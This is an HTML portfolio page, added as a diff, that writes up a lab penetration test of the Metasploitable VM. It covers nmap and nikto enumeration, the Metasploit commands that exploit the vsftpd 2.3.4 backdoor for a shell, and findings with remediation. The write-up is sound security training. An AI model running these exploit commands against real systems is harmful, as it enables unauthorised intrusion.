@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Metasploitable Pentest - Christian Galvez</title>
+  <link rel="stylesheet" href="../assets/styles.css">
+  <style>
+    main { max-width: 900px; margin: 30px auto; padding: 0 20px; }
+    pre { background:#f3f4f6; padding:12px; overflow:auto; border-radius:6px; }
+    .severity { font-weight:700; color:#a00; }
+  </style>
+</head>
+<body>
+  <header class="navbar">
+    <nav>
+      <ul>
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../about.html">About</a></li>
+        <li><a href="../projects.html">Projects</a></li>
+        <li><a href="../contact.html">Contact</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <section class="hero">
+      <h1>Metasploitable Pentest</h1>
+      <p><strong>Summary:</strong> Lab-based penetration test against Metasploitable to practice enumeration, exploitation, and reporting. Ethical lab, isolated environment.</p>
+    </section>
+
+    <section>
+      <h2>Tools & scope</h2>
+      <ul>
+        <li>Nmap, Metasploit Framework, smbclient, nikto, curl, nc</li>
+        <li>Target: Metasploitable (lab VM only)</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Objective / threat scenario</h2>
+      <p>Assess common legacy vulnerabilities and demonstrate the full chain: discovery → exploit → proof → remediation.</p>
+    </section>
+
+    <section>
+      <h2>Enumeration (example)</h2>
+      <pre><code># Initial port and service scan
+nmap -sC -sV -oN nmap_initial.txt 10.0.2.20
+
+# Quick web scan
+nikto -host http://10.0.2.20
+</code></pre>
+      <p>Sample relevant nmap output (trimmed):</p>
+      <pre><code>PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 2.3.4
+22/tcp   open  ssh      OpenSSH 4.7p1
+80/tcp   open  http     Apache 2.2.8
+139/tcp  open  netbios-ssn Samba smbd 3.X
+</code></pre>
+    </section>
+
+    <section>
+      <h2>Exploit (example: vsftpd 2.3.4 backdoor)</h2>
+      <pre><code># Metasploit example
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 10.0.2.20
+exploit
+
+# After successful exploit
+whoami
+</code></pre>
+      <p>Proof of concept: captured shell, `whoami` showed <code>msfuser</code>. Stored session logs in artifacts.</p>
+    </section>
+
+    <section>
+      <h2>Findings</h2>
+      <ul>
+        <li><span class="severity">High:</span> Unauthenticated FTP backdoor (vsftpd 2.3.4) — remote code execution</li>
+        <li><span class="severity">Medium:</span> Outdated web server and default creds on some services</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Remediation</h2>
+      <ol>
+        <li>Patch or replace vulnerable services (upgrade vsftpd to supported version)</li>
+        <li>Restrict management services to internal networks only</li>
+        <li>Implement IDS rules to detect exploit signatures</li>
+      </ol>
+    </section>
+
+    <section>
+      <h2>Artifacts</h2>
+      <ul>
+        <li><a href="../assets/nmap_initial.txt" target="_blank">nmap_initial.txt</a></li>
+        <li><a href="../assets/metasploit_session_log.txt" target="_blank">metasploit_session_log.txt</a></li>
+        <li><a href="../assets/metasploitable_writeup.pdf" target="_blank">Full writeup (pdf)</a></li>
+      </ul>
+      <p>Upload these files to <code>/assets</code> and update or keep the exact names above for the links to work.</p>
+    </section>
+
+    <section>
+      <h2>TL;DR</h2>
+      <ul>
+        <li>Carried out standard enumeration and exploited a known backdoor to demonstrate RCE</li>
+        <li>Deliverables include raw scan logs and a remediation checklist</li>
+        <li>Ethical, lab-only exercise; reproducible steps included</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>
+    <p>© 2025 Christian Galvez</p>
+  </footer>
+</body>
+</html>
